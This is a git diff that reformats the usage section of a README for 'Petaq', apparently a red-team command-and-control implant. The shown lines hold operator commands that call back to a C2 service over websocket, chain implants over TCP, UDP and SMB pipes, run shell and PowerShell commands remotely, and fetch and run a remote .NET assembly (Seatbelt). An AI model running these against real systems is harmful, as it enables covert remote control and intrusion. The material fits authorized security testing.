@@ -96,14 +96,22 @@ CApplication is shutting down...
 # Usage Examples
 Petaq Implant Run Arguments:
 1. It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
-    ```petaqimplant.exe ws://172.16.121.1/ws
-    petaqimplant.exe wss://172.16.121.1:443/ws``` (SSL)
+```
+    petaqimplant.exe ws://172.16.121.1/ws
+    petaqimplant.exe wss://172.16.121.1:443/ws (SSL)
+```
 2. It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
-    ```petaqimplant.exe tcp 8000```
+```
+   petaqimplant.exe tcp 8000
+```
 3. It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
-    ```petaqimplant.exe udp 8000```
+```
+    petaqimplant.exe udp 8000
+```
 4. It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
-    ```petaqimplant.exe smb pipename1```
+```
+   petaqimplant.exe smb pipename1
+```
 
 Petaq Service Commands:
 ```
@@ -119,10 +127,12 @@ Petaq Service Commands:
         route
     Exit:
         exit
-        terminate```
+        terminate
+```
 Practical Examples on Petaq Implant in Interaction (use ImplantID):
 Usage Examples:
-```exec cmd /c dir
+```
+	exec cmd /c dir
         exec net use
         exec powershell -c Write-Output($env:UserName)
         exec-sharpassembly url http://127.0.0.1/Seatbelt.exe BasicOSInfo
@@ -134,7 +144,8 @@ Usage Examples:
         link tcp://127.0.0.1/8002
         link udp://127.0.0.1/8002
         link smb://127.0.0.1
-        link smb://127.0.0.1/petaq_comm```
+        link smb://127.0.0.1/petaq_comm
+```
 Link operations:
 ```route
         sessions
